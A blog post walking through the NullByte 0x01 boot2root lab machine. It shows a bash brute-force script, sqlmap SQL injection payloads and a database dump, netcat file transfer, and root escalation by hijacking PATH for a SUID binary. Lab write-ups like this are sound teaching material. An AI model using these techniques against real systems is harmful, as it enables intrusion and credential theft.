---
layout: post
title: "NullByte 0x01 Hacking Challenge"
date: 2015-08-06 00:27:34 -0400
comments: true
categories: boot2root
---

I saw this boot2root announced on [Twitter](https://twitter.com/ly0nx/status/627625979041697792) by [ly0nx](https://twitter.com/ly0nx) and decided to give it a go. It's not on VulnHub yet, but it looks like it might make it there sometime after Blackhat and Defcon is over. The boot2root is called NullByte 0x01 and is described as beginner/intermediate level challenge. I thought it was pretty easy, but still a fun challenge nonetheless. You can grab it at [http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/](http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/).

<!--more-->

I found the IP address of the target using netdiscover, and ran a full portscan on it. This returned the following results: 

```
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
56763/tcp open  status  1 (RPC #100024)
111/udp  open  rpcbind
5353/udp open  zeroconf
```

Web server on port 80, and SSH on non-standard port 777. I loaded up the web site on my browser: 

->![](/images/2015-08-06/01.png)<-

I ran nikto and wfuzz on the web server as well and came up with a handful of interesting directories, but nothing that I could leverage at the moment: 

```
# wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://192.168.107.135/FUZZ

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.107.135/FUZZ
Payload type: file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

Total requests: 220560
==================================================================
ID  Response   Lines      Word         Chars          Request    
==================================================================

.
.
.
00162:  C=301      9 L        28 W      320 Ch    " - uploads"
01070:  C=301      9 L        28 W      323 Ch    " - javascript"
10821:  C=301      9 L        28 W      323 Ch    " - phpmyadmin"
.
.
.
```

Back to the web page, I decided to examine the image main.gif. Running exiftool on it revealed something interesting in the comments section: 

```
# exiftool main.gif 
ExifTool Version Number         : 8.60
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2015:08:01 12:39:30-04:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
```

At first I thought kzMb5nVYJw was some kind of encrypted text. I tried simple ciphers like ROT13 and Caesar, but nothing returned anything interesting. I tried using it as a password, but that didn't work. What eventually did work was using it in the URL: 


->![](/images/2015-08-06/02.png)<-

It was a form asking for a key. Viewing the source revealed a clue: 

```html
<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form> 
</center>
<!-- this form isn't connected to mysql, password ain't that complex --!>
```

Ok, so looks like I had to brute force a password. Not the most enjoyable thing, but necessary to continue. After trying several small wordlists, the winner was /usr/share/dict/words. I wrote the following script to brute force the password for me: 

```bash
#!/bin/bash

passwdlist=$1
echo "Brute forcing key..."
while read password; do 
    out=`curl -s -d "key=${password}" http://192.168.107.135/kzMb5nVYJw/index.php`
    echo ${out} | grep "invalid key" >/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "Found key \e[32m${password}"
        break
    fi 
done < ${passwdlist}
```

And here it is in action: 

```text
# ./brute.sh /usr/share/dict/words
Brute forcing key...
Found key elite
```

Took a few minutes, but I found the key. I punched it in and was greeted with yet another form. This time it was asking for a username to look up:

->![](/images/2015-08-06/03.png)<-

Viewing the source revealed another PHP file; 420search.php:  

```html
<p>Search for usernames: </p>
<hr>
<form action="420search.php" method="get">
Enter username:<br>
<input type="text" name="usrtosearch">
</form>
```

Accessing the URL for this revealed some interesting leaks: 

->![](/images/2015-08-06/04.png)<-

Two usernames, IDs, and positions. It looked like fields in a database. While the previous form wasn't connected to a database, I was betting that this one was. Searching for username resulted in the following URL: http://192.168.107.135/kzMb5nVYJw/420search.php?usrtosearch=ramses

I figured usrtosearch might be vulnerable to SQL injection, so I ran sqlmap against it:

```text
# sqlmap --url 'http://192.168.107.135/kzMb5nVYJw/420search.php?usrtosearch=ramses' --risk=2 --dbms=MySQL --level=2 --dbs
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150731}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:16:20

[23:16:20] [INFO] testing connection to the target URL
[23:16:20] [INFO] testing if the target URL is stable. This can take a couple of seconds
[23:16:21] [INFO] target URL is stable
[23:16:21] [INFO] testing if GET parameter 'usrtosearch' is dynamic
[23:16:21] [INFO] confirming that GET parameter 'usrtosearch' is dynamic
[23:16:21] [INFO] GET parameter 'usrtosearch' is dynamic
[23:16:21] [INFO] heuristic (basic) test shows that GET parameter 'usrtosearch' might be injectable (possible DBMS: 'MySQL')
.
.
.
sqlmap identified the following injection points with a total of 64 HTTP(s) requests:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: usrtosearch=ramses" AND 2672=2672#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: usrtosearch=ramses" AND (SELECT 6198 FROM(SELECT COUNT(*),CONCAT(0x7178766b71,(SELECT (CASE WHEN (6198=6198) THEN 1 ELSE 0 END)),0x7162767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND "lSdU"="lSdU

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=ramses" UNION ALL SELECT CONCAT(0x7178766b71,0x6d69594f6768697a614b,0x7162767171),NULL,NULL#

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind (SELECT)
    Payload: usrtosearch=ramses" AND (SELECT * FROM (SELECT(SLEEP(5)))WqJu) AND "TIaN"="TIaN
---
[23:17:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.10
back-end DBMS: MySQL 5.0
[23:17:05] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] seth

[23:17:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.107.135'

[*] shutting down at 23:17:05
```

Perfect. I dumped the contents of the seth database which revealed some juicy data: 

```
# sqlmap --url 'http://192.168.107.135/kzMb5nVYJw/420search.php?usrtosearch=ramses' --risk=2 --dbms=MySQL --level=2 -D seth --dump
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150731}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:20:16

[23:20:16] [INFO] testing connection to the target URL
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: usrtosearch=ramses" AND 7400=7400#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: usrtosearch=ramses" AND (SELECT 5418 FROM(SELECT COUNT(*),CONCAT(0x7176716a71,(SELECT (CASE WHEN (5418=5418) THEN 1 ELSE 0 END)),0x7170716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND "pVLf"="pVLf

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=ramses" UNION ALL SELECT NULL,NULL,CONCAT(0x7176716a71,0x474e5446774b66716f49,0x7170716a71)#

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind (SELECT)
    Payload: usrtosearch=ramses" AND (SELECT * FROM (SELECT(SLEEP(5)))tcur) AND "xRCR"="xRCR
---
[23:20:16] [INFO] testing MySQL
[23:20:16] [INFO] confirming MySQL
[23:20:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.0
[23:20:16] [INFO] fetching tables for database: 'seth'
[23:20:16] [INFO] fetching columns for table 'users' in database 'seth'
[23:20:16] [INFO] fetching entries for table 'users' in database 'seth'
[23:20:16] [INFO] analyzing table dump for possible password hashes
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+

[23:20:16] [INFO] table 'seth.users' dumped to CSV file '/root/.sqlmap/output/192.168.107.135/dump/seth/users.csv'
[23:20:16] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.107.135'

[*] shutting down at 23:20:16
```

There's a Base64 MD5 hash for ramses' password. To crack it, I just Googled it:

->![](/images/2015-08-06/05.png)<-

Password was omega, and it turned out those were the SSH credentials for ramses. 

```
# ssh -p777 ramses@192.168.107.135
ramses@192.168.107.135's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
ramses@NullByte:~$ hostname
NullByte
ramses@NullByte:~$ id
uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
ramses@NullByte:~$
```

A quick scan around the files in ramses' directory revealed some interesting information in the .bash_history file:

```
ramses@NullByte:~$ cat .bash_history 
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch 
clear
sudo -s
cd /
ls
exit
```

Looks like there was something called procwatch in /var/www/backup. This file was SUID root, which made me suspect that it might be exploitable in some way. 

```
ramses@NullByte:~$ ls -l /var/www/backup/procwatch 
-rwsr-xr-x 1 root root 4932 Aug  2 01:29 /var/www/backup/procwatch
```

procwatch appeared to just run ps:

```
ramses@NullByte:~$ /var/www/backup/procwatch 
  PID TTY          TIME CMD
 1430 pts/0    00:00:00 procwatch
 1431 pts/0    00:00:00 sh
 1432 pts/0    00:00:00 ps
```

So I decided to transfer the binary over to my machine for further examination. I setup a netcat listener to receive procwatch and used netcat on the target to send it over. 

```
ramses@NullByte:/var/www/backup$ nc 192.168.107.129 4444 < procwatch 
```

With the binary on hand, I loaded it up in gdb to see what was going on:

```
# gdb -q procwatch 
Reading symbols from /root/nullbyte/procwatch...(no debugging symbols found)...done.
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x080483fb <+0>: lea    ecx,[esp+0x4]
   0x080483ff <+4>: and    esp,0xfffffff0
   0x08048402 <+7>: push   DWORD PTR [ecx-0x4]
   0x08048405 <+10>:    push   ebp
   0x08048406 <+11>:    mov    ebp,esp
   0x08048408 <+13>:    push   ecx
   0x08048409 <+14>:    sub    esp,0x44
   0x0804840c <+17>:    lea    eax,[ebp-0x3a]
   0x0804840f <+20>:    mov    WORD PTR [eax],0x7370
   0x08048414 <+25>:    mov    BYTE PTR [eax+0x2],0x0
   0x08048418 <+29>:    sub    esp,0xc
   0x0804841b <+32>:    lea    eax,[ebp-0x3a]
   0x0804841e <+35>:    push   eax
   0x0804841f <+36>:    call   0x80482d0 <system@plt>
   0x08048424 <+41>:    add    esp,0x10
   0x08048427 <+44>:    mov    eax,0x0
   0x0804842c <+49>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x0804842f <+52>:    leave  
   0x08048430 <+53>:    lea    esp,[ecx-0x4]
   0x08048433 <+56>:    ret    
End of assembler dump.
```

I set a breakpoint at the call to system() and ran it. Once it hit the breakpoint, I looked at the arguments being passed to system:

```
Guessed arguments:
arg[0]: 0xfff4906e --> 0x7370 ('ps')
arg[1]: 0x0 
arg[2]: 0xc2 
arg[3]: 0xf76735a6 (test   eax,eax)
```

Sure enough, it was running ps, but without an absolute path. That meant I could trick the binary into running my own ps as long as I made the current directory the priority in my PATH environment. 

Back on the target I updated my PATH environment and symlinked /bin/sh into ps. Running procwatch again gave me a root shell:

```
ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
ramses@NullByte:/var/www/backup$ ln -s /bin/sh ps
ramses@NullByte:/var/www/backup$ ./procwatch 
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```

All that was left was to read the flag:

```
# ls /root
proof.txt
# cat /root/proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----
```

Done and done!
